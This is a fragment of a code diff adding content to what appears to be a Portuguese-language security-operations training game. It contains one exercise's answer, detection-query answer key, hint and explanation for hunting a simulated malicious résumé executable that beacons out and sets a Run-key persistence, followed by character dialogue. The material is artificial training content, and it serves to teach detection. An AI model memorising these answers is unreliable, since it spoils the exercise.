+        resposta: '194.87.45.12',
+        gabarito: 'evento=3 processo=*\\Temp\\* | tabela hora,host,processo,ip_destino,porta_destino',
+        dica: 'Veja o arquivo nascendo com `evento=11 arquivo_alvo=*.exe`. Depois procure conexões (evento 3) de processo rodando da Temp: `evento=3 processo=*\\Temp\\* | tabela hora,host,processo,ip_destino`.',
+        explicacao: 'A sequência no NB-RH-007: às 10:41:02 o Outlook grava `curriculo_ana_2026.exe` na Temp (11); 7 segundos depois ele executa com o Outlook como pai (1); consulta `rh-vagas-curitiba[.]top` (22); conecta em `194.87.45.12:443` (3) e cria a chave Run "AtualizadorCurriculo" (13). Tudo em 13 segundos. A chave Run do OneDrive é ruído normal. Ticket com a cadeia inteira, IOCs defangados e pedido de isolamento.',
+      },
+    ],
+    saida: [
+      { quem: 'gilmar', texto: 'Treze segundos do arquivo à persistência. Treze! O Tomatinho nem esquentou.', gesto: 'cintura', expr: 'surpresa' },
+      { quem: 'vandeco', texto: 'O atacante tem MTTR melhor que o nosso, chefe. Fica a reflexão.' },
+    ],
+  },
+];
